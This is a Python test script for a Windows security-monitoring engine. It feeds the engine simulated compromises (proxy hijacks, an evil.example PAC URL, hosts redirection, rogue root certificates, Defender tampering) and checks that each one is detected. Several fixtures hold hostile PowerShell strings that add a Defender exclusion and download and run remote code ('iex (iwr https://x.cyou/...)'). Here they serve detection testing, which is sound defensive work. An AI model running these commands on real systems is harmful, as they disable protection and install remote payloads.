# -*- coding: utf-8 -*-
"""模擬測試：不改任何真實設定，只把收集到的資料在記憶體裡改掉，看引擎抓不抓得到。"""
import sys, copy, json, types
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import secguard as S
if not os.path.exists(S.BASELINE):
    S.scan(do_notify=False)  # 第一次：先建立基準線
real = S.collect()
base = S._load(S.BASELINE, None)
cases = {}
d = copy.deepcopy(real); d['proxy']['ProxyEnable'] = 1; d['proxy']['ProxyServer'] = '127.0.0.1:59999'; cases['proxy_dead_port'] = d
d = copy.deepcopy(real); d['proxy']['ProxyEnable'] = 1; d['proxy']['ProxyServer'] = '45.1.2.3:8080'; cases['proxy_remote'] = d
d = copy.deepcopy(real); d['proxy']['AutoConfigURL'] = 'http://evil.example/p.pac'; cases['pac'] = d
d = copy.deepcopy(real); d['env_proxy'] = {'User:HTTPS_PROXY': 'http://127.0.0.1:7890'}; cases['env_proxy'] = d
d = copy.deepcopy(real); d['hosts']['lines'] = ['172.67.171.221 urban-mint-731.com'] + [x for x in d['hosts']['lines'] if 'urban' not in x]; cases['hosts_hijack'] = d
d = copy.deepcopy(real); d['tasks'].append({'key': '\\Microsoft\\Windows\\Policies\\MicrosoftVersionAgentV2', 'state': 'Ready', 'author': '', 'date': '', 'act': 'powershell.exe -w hidden -c "Add-MpPreference -ExclusionPath C:\\Windows\\System32; iex (iwr https://x.cyou/a)"'}); cases['evil_task'] = d
d = copy.deepcopy(real); d['tasks'].append({'key': '\\OhmSecGuard_New', 'state': 'Ready', 'author': '', 'date': '', 'act': 'pythonw.exe C:\\Tools\\OhmSecGuard\\x.py'}); cases['own_task'] = d
d = copy.deepcopy(real); d['conn_top'] = [{'pid': 999, 'count': 6012, 'name': 'node', 'path': ''}]; cases['conn_spike'] = d
d = copy.deepcopy(real); d['defender']['rtp'] = False; cases['defender_off'] = d
d = copy.deepcopy(real); d['dynport'] = {'start': 1025, 'num': 64510}; cases['dynport'] = d
d = copy.deepcopy(real); d['ioc'] = ['C:\\Windows\\System32\\MicrosoftVersionAgentV1-nf2t']; cases['ioc_dir'] = d
d = copy.deepcopy(real); d['runmru'] = list(d.get('runmru') or []) + ['RunMRU|powershell -w h -c "iex(iwr https://x.cyou/v)"\\1']; cases['clickfix'] = d
d = copy.deepcopy(real); d['browser_policy'] = dict(d.get('browser_policy') or {}, **{'HKCU\\Google\\Chrome\\ProxyServer': '10.0.0.9:8080'}); cases['browser_proxy'] = d
d = copy.deepcopy(real); d['rootcerts'] = list(d.get('rootcerts') or []) + ['CurrentUser|ABCDEF0123|CN=Totally Legit Root']; cases['root_cert'] = d
d = copy.deepcopy(real); d['def_events'] = [{'id': 5007, 'rec': 99999, 'time': '2099-01-01 00:00:00', 'msg': 'Exclusions\\Paths\\C:\\Windows\\System32 added'}]; cases['def_5007'] = d
d = copy.deepcopy(real); d['def_policy'] = {'\\Real-Time Protection\\DisableRealtimeMonitoring': '1'}; cases['def_policy'] = d
F0, _ = S.analyse(real, base)
base_ids = {f['id'] for f in F0}
print('REAL:', sorted(base_ids))
ok = True
expect = {'proxy_dead_port': 'proxy_dead', 'proxy_remote': 'proxy_remote', 'pac': 'proxy_pac', 'env_proxy': 'changed_env_proxy',
          'hosts_hijack': 'hosts_redirect_urban-mint-731.com', 'evil_task': 'task_sus_', 'own_task': 'changed_tasks', 'conn_spike': 'conn_node',
          'defender_off': 'def_off', 'dynport': 'dynport', 'ioc_dir': 'ioc_dir', 'clickfix': 'clickfix_', 'browser_proxy': 'browser_proxy_',
          'root_cert': 'changed_rootcert', 'def_5007': 'defev_', 'def_policy': 'defpol_'}
for name, d in cases.items():
    F, _ = S.analyse(d, base)
    new = [f for f in F if f['id'] not in base_ids or (name == 'own_task' and f['id'] == 'changed_tasks')]
    hit = [f for f in new if f['id'].startswith(expect[name])]
    flag = 'PASS' if hit else 'FAIL'
    ok &= bool(hit)
    print('%-16s %s  %s' % (name, flag, ' | '.join('[%s%s] %s' % (f['level'], '*' if f['notify'] else '', f['title']) for f in new)))
# own task must be info & not notify
F, _ = S.analyse(cases['own_task'], base)
own = [f for f in F if f['id'] == 'changed_tasks'][0]
print('own_task level', own['level'], 'notify', own['notify'])
# notify dedup (fake queue, no real popup)
sent_box = []
fake = types.ModuleType('_notify_queue'); fake.enqueue = lambda *a, **k: sent_box.append(k.get('dedup_key')) or 'x'
sys.modules['_notify_queue'] = fake
S._toast = lambda title, body: sent_box.append(title)  # 測試不真的跳通知
S.NOTIFIED = S.NOTIFIED + '.test'
F, _ = S.analyse(cases['proxy_dead_port'], base)
a = S._notify(F); b = S._notify(F)
print('notify 1st', a, '2nd', b, 'queue', len(sent_box))
import os; os.remove(S.NOTIFIED)
print('ALL PASS (%d cases)' % len(cases) if ok and a and not b else 'SOME FAIL')
